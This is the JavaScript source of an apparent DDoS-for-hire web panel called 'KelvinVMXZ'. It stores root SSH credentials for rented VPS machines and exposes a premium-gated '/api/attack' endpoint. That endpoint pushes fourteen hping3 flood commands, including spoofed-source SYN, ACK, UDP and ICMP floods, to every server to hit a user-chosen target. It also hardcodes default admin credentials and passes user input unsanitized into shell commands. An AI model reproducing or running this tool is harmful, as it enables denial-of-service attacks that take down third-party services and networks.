const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const { Client } = require('ssh2');
const axios = require('axios');
const net = require('net');

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'kelvinvmxz-super-secret-key-2024';

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

// Pastikan folder db ada
if (!fs.existsSync('./db')) fs.mkdirSync('./db');

// Inisialisasi file database
const initDB = () => {
    const files = {
        './db/users.json': [{ 
            id: 1, 
            username: 'admin', 
            password: bcrypt.hashSync('kelvinvmxz', 10),
            role: 'owner',
            plan: 'premium'
        }],
        './db/vps.json': [],
        './db/plans.json': {},
        './db/attack-history.json': [],
        './db/ongoing-attacks.json': []
    };
    
    for (const [file, defaultData] of Object.entries(files)) {
        if (!fs.existsSync(file)) {
            fs.writeFileSync(file, JSON.stringify(defaultData, null, 2));
        }
    }
};

initDB();

// Helper functions
const loadData = (file) => {
    try {
        return JSON.parse(fs.readFileSync(`./db/${file}.json`, 'utf8'));
    } catch (e) {
        return [];
    }
};

const saveData = (file, data) => {
    fs.writeFileSync(`./db/${file}.json`, JSON.stringify(data, null, 2));
};

const authMiddleware = (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'No token' });
    
    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        req.user = decoded;
        next();
    } catch (e) {
        res.status(401).json({ error: 'Invalid token' });
    }
};

// Auth Routes
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    const users = loadData('users');
    const user = users.find(u => u.username === username);
    
    if (!user || !bcrypt.compareSync(password, user.password)) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    const token = jwt.sign({ 
        id: user.id, 
        username: user.username, 
        role: user.role,
        plan: user.plan 
    }, JWT_SECRET);
    
    res.json({ token, user: { username: user.username, role: user.role, plan: user.plan } });
});

app.post('/api/register', authMiddleware, (req, res) => {
    if (req.user.role !== 'owner') return res.status(403).json({ error: 'Owner only' });
    
    const { username, password, role = 'user', plan = 'free' } = req.body;
    const users = loadData('users');
    
    if (users.find(u => u.username === username)) {
        return res.status(400).json({ error: 'User exists' });
    }
    
    users.push({
        id: Date.now(),
        username,
        password: bcrypt.hashSync(password, 10),
        role,
        plan
    });
    
    saveData('users', users);
    res.json({ success: true });
});

// VPS Management
app.get('/api/vps', authMiddleware, (req, res) => {
    const vpsList = loadData('vps');
    res.json(vpsList);
});

app.post('/api/vps', authMiddleware, (req, res) => {
    if (!['owner', 'admin'].includes(req.user.role)) {
        return res.status(403).json({ error: 'Admin only' });
    }
    
    const vpsList = loadData('vps');
    const newVPS = { id: Date.now(), ...req.body, status: 'unknown' };
    vpsList.push(newVPS);
    saveData('vps', vpsList);
    
    res.json({ success: true });
});

app.delete('/api/vps/:id', authMiddleware, (req, res) => {
    if (!['owner', 'admin'].includes(req.user.role)) {
        return res.status(403).json({ error: 'Admin only' });
    }
    
    const vpsList = loadData('vps');
    const filtered = vpsList.filter(v => v.id !== parseInt(req.params.id));
    saveData('vps', filtered);
    
    res.json({ success: true });
});

// VPS Status Check
app.post('/api/vps/check', authMiddleware, async (req, res) => {
    if (!['owner', 'admin'].includes(req.user.role)) {
        return res.status(403).json({ error: 'Admin only' });
    }
    
    const vpsList = loadData('vps');
    const results = [];
    
    for (const vps of vpsList) {
        const isAlive = await new Promise((resolve) => {
            const conn = new Client();
            conn.on('ready', () => { conn.end(); resolve(true); })
                .on('error', () => resolve(false))
                .connect({
                    host: vps.host,
                    username: vps.username || 'root',
                    password: vps.password,
                    readyTimeout: 5000
                });
        });
        
        vps.status = isAlive ? 'online' : 'offline';
        results.push({ host: vps.host, status: vps.status });
    }
    
    // Hapus VPS yang offline
    const onlineVPS = vpsList.filter(v => v.status === 'online');
    saveData('vps', onlineVPS);
    
    res.json({ checked: results, remaining: onlineVPS.length });
});

// Attack Commands
const attackMethods = {
    'syn-pps': (target, port, time) => `sudo timeout ${time}s hping3 -S --flood -p ${port} ${target}`,
    'syn-gbps': (target, port, time) => `sudo timeout ${time}s hping3 -S --flood --data 65495 -p ${port} ${target}`,
    'ack-pps': (target, port, time) => `sudo timeout ${time}s hping3 -A --flood -p ${port} ${target}`,
    'ack-gbps': (target, port, time) => `sudo timeout ${time}s hping3 -A --flood --data 65495 -p ${port} ${target}`,
    'icmp-pps': (target, port, time) => `sudo timeout ${time}s hping3 --icmp --flood ${target}`,
    'icmp-gbps': (target, port, time) => `sudo timeout ${time}s hping3 --icmp --flood --data 65495 ${target}`,
    'rand-udp': (target, port, time) => `sudo timeout ${time}s hping3 --udp --flood --rand-source -p ${port} ${target}`,
    'rand-syn': (target, port, time) => `sudo timeout ${time}s hping3 -S --flood --rand-source -p ${port} ${target}`,
    'rand-ack': (target, port, time) => `sudo timeout ${time}s hping3 -A --flood --rand-source -p ${port} ${target}`,
    'udp-multi': (target, port, time) => `sudo timeout ${time}s hping3 --udp --flood -p ${port} ${target}`,
    'syn-rand': (target, port, time) => `sudo timeout ${time}s hping3 -S --flood --rand-source -p ${port} ${target}`,
    'ack-rand': (target, port, time) => `sudo timeout ${time}s hping3 -A --flood --rand-source -p ${port} ${target}`,
    'icmp-rand': (target, port, time) => `sudo timeout ${time}s hping3 --icmp --flood --rand-source ${target}`,
    'oblivion': (target, port, time) => `sudo timeout ${time}s hping3 -S -A -F -P -U --flood --rand-source -p ${port} ${target}`
};

app.post('/api/attack', authMiddleware, async (req, res) => {
    const { target, port, time, method } = req.body;
    
    if (!target || !port || !time || !method) {
        return res.status(400).json({ error: 'Missing parameters' });
    }
    
    if (!attackMethods[method]) {
        return res.status(400).json({ error: 'Invalid method' });
    }
    
    if (req.user.plan === 'free') {
        return res.status(403).json({ error: 'Premium only' });
    }
    
    const vpsList = loadData('vps');
    if (vpsList.length === 0) {
        return res.status(400).json({ error: 'No VPS available' });
    }
    
    const command = attackMethods[method](target, port, time);
    const attackId = Date.now().toString();
    
    const attack = {
        id: attackId,
        user: req.user.username,
        target: `${target}:${port}`,
        method: method.toUpperCase(),
        time: `${time}s`,
        startTime: new Date().toISOString(),
        status: 'RUNNING'
    };
    
    const ongoing = loadData('ongoing-attacks');
    ongoing.push(attack);
    saveData('ongoing-attacks', ongoing);
    
    let success = 0;
    const vpsResults = [];
    
    for (const vps of vpsList) {
        try {
            const conn = new Client();
            await new Promise((resolve) => {
                conn.on('ready', () => {
                    const screenName = `attack_${attackId}_${Math.random().toString(36).substr(2, 9)}`;
                    conn.exec(
                        `screen -dmS ${screenName} bash -c "${command}; sleep 1"`,
                        (err) => {
                            if (!err) {
                                success++;
                                vpsResults.push({ host: vps.host, success: true });
                            } else {
                                vpsResults.push({ host: vps.host, success: false, error: err.message });
                            }
                            conn.end();
                            resolve();
                        }
                    );
                }).on('error', () => {
                    vpsResults.push({ host: vps.host, success: false });
                    resolve();
                }).connect({
                    host: vps.host,
                    username: vps.username || 'root',
                    password: vps.password,
                    readyTimeout: 10000
                });
            });
        } catch (e) {
            vpsResults.push({ host: vps.host, success: false, error: e.message });
        }
    }
    
    // Move to history
    const history = loadData('attack-history');
    attack.status = 'COMPLETED';
    attack.endTime = new Date().toISOString();
    attack.vpsResults = vpsResults;
    history.push(attack);
    saveData('attack-history', history);
    
    // Remove from ongoing
    const updatedOngoing = ongoing.filter(a => a.id !== attackId);
    saveData('ongoing-attacks', updatedOngoing);
    
    res.json({
        success: true,
        attackId,
        results: {
            success,
            failed: vpsList.length - success,
            total: vpsList.length,
            vpsResults
        }
    });
});

// Get ongoing attacks
app.get('/api/attacks/ongoing', authMiddleware, (req, res) => {
    const ongoing = loadData('ongoing-attacks');
    res.json(ongoing);
});

// Get attack history
app.get('/api/attacks/history', authMiddleware, (req, res) => {
    const history = loadData('attack-history');
    res.json(history.slice(-50)); // Last 50 attacks
});

// Stop all attacks
app.post('/api/attacks/stop', authMiddleware, (req, res) => {
    if (!['owner', 'admin'].includes(req.user.role)) {
        return res.status(403).json({ error: 'Admin only' });
    }
    
    const vpsList = loadData('vps');
    
    for (const vps of vpsList) {
        try {
            const conn = new Client();
            conn.on('ready', () => {
                conn.exec('pkill -9 hping3 && pkill -f "attack_" && screen -ls | grep attack_ | cut -d. -f1 | xargs -I {} screen -X -S {} quit', () => {
                    conn.end();
                });
            }).connect({
                host: vps.host,
                username: vps.username || 'root',
                password: vps.password
            });
        } catch (e) {
            console.log(`Error stopping ${vps.host}: ${e.message}`);
        }
    }
    
    // Clear ongoing attacks
    saveData('ongoing-attacks', []);
    
    res.json({ success: true });
});

// Check Host functionality
app.post('/api/check-host', authMiddleware, async (req, res) => {
    const { ip, port, mode } = req.body;
    
    try {
        const result = await checkHostReal(ip, port, mode);
        res.json(JSON.parse(result));
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Helper function for check-host (sama seperti di Telegram bot)
async function checkHostReal(ip, port, mode = 'tcp') {
    try {
        const nodeConfigs = {
            'tcp': ['us1.node.check-host.net', 'de1.node.check-host.net', 'sg1.node.check-host.net'],
            'ping': ['us1.node.check-host.net', 'de1.node.check-host.net', 'sg1.node.check-host.net'],
            'udp': ['us1.node.check-host.net', 'de1.node.check-host.net', 'sg1.node.check-host.net']
        };
        
        const selectedNodes = nodeConfigs[mode] || nodeConfigs['tcp'];
        const nodeParam = selectedNodes.map(node => `&node=${node}`).join('');
        
        const checkUrl = `https://check-host.net/check-${mode}?host=${ip}:${port}&max_nodes=5${nodeParam}`;
        
        const response = await axios.get(checkUrl, {
            headers: { 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0' },
            timeout: 10000
        });
        
        if (!response.data?.request_id) {
            throw new Error('Invalid response from check-host.net');
        }
        
        const requestId = response.data.request_id;
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        const resultUrl = `https://check-host.net/check-result/${requestId}`;
        const resultResponse = await axios.get(resultUrl, {
            headers: { 'Accept': 'application/json' },
            timeout: 15000
        });
        
        return JSON.stringify({
            success: true,
            data: resultResponse.data,
            permanent_link: response.data.permanent_link
        });
        
    } catch (error) {
        return JSON.stringify({
            error: true,
            message: error.message
        });
    }
}

// Auto cleanup expired attacks
setInterval(() => {
    const ongoing = loadData('ongoing-attacks');
    const history = loadData('attack-history');
    const now = Date.now();
    
    for (let i = ongoing.length - 1; i >= 0; i--) {
        const attack = ongoing[i];
        const startTime = new Date(attack.startTime).getTime();
        const duration = parseInt(attack.time) * 1000;
        
        if (now - startTime > duration) {
            attack.status = 'EXPIRED';
            attack.endTime = new Date().toISOString();
            history.push(attack);
            ongoing.splice(i, 1);
        }
    }
    
    saveData('ongoing-attacks', ongoing);
    if (history.length > 100) {
        saveData('attack-history', history.slice(-100));
    }
}, 15000);

// Dashboard stats
app.get('/api/stats', authMiddleware, (req, res) => {
    const vps = loadData('vps');
    const ongoing = loadData('ongoing-attacks');
    const history = loadData('attack-history');
    const users = loadData('users');
    const plans = loadData('plans');
    
    res.json({
        vps: { total: vps.length, online: vps.filter(v => v.status === 'online').length },
        attacks: { ongoing: ongoing.length, total: history.length },
        users: { total: users.length, premium: Object.keys(plans).length },
        methods: Object.keys(attackMethods).length
    });
});

app.listen(PORT, () => {
    console.log(`🚀 KelvinVMXZ Web Panel running on port ${PORT}`);
    console.log(`📊 Dashboard: http://localhost:${PORT}`);
    console.log(`🔐 Login with username: admin, password: kelvinvmxz`);
});
